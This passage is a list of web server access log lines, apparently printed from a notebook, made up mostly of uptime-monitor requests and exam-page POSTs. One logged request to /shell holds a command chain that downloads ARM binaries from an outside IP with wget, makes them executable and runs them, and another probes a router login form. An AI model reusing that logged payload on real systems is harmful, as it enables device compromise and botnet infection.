              " '103.44.12.218 - - [19/Mar/2021:14:45:15 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:45:45 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:46:15 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:46:44 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:47:14 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:47:44 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:48:14 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:48:44 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:49:14 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:49:44 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:50:14 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:50:44 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:51:13 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:51:43 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:52:13 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:52:43 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:53:13 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:53:43 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:54:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:54:43 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:55:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:55:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:56:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:56:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:57:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:57:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:58:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:58:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:59:11 +0000] \"GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\\\\x5C/45.14.149.244/bins/arm7;chmod+777+arm7;./arm7+jaws;wget+http:/\\\\x5C/45.14.149.244/bins/arm;chmod+777+arm;./arm+jaws HTTP/1.1\" 400 182 \"-\" \"KrebsOnSecurity\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:59:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:59:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:00:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:00:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:01:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:01:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:02:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:02:41 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:03:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:03:43 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:04:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:04:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:05:10 +0000] \"POST /boaform/admin/formLogin HTTP/1.1\" 404 151 \"http://43.225.23.133:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:05:10 +0000] \"\" 400 0 \"-\" \"-\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:05:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:05:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:06:11 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:06:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:07:11 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:07:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:08:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:08:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:09:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:09:42 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:09 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:09 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:09 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:09 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:09 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:10 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10400 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:10 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10379 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:10 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10378 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:10 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10403 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:10 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10358 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:12 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10370 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:18 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10375 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10377 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10375 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10363 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10376 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/174/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/173/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10367 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"GET /exam/login/?next=/exam/174/check/1/6/16/16/ HTTP/1.1\" 200 2406 \"http://${BASE_URL_1}/exam/173/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:19 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"GET /exam/login/?next=/exam/165/check/1/6/16/16/ HTTP/1.1\" 200 2402 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10368 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"GET /exam/login/?next=/exam/167/check/1/6/16/16/ HTTP/1.1\" 200 2405 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10401 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10386 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:20 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10374 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10377 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10389 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10397 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10367 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:21 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10401 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"GET /exam/login/?next=/exam/166/check/1/6/16/16/ HTTP/1.1\" 200 2404 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10357 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10412 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10375 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"GET /exam/login/?next=/exam/165/check/1/6/16/16/ HTTP/1.1\" 200 2405 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10365 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:22 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:23 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:23 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10361 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:24 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10386 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:24 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10390 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:24 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:24 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:15:10:24 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 562 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
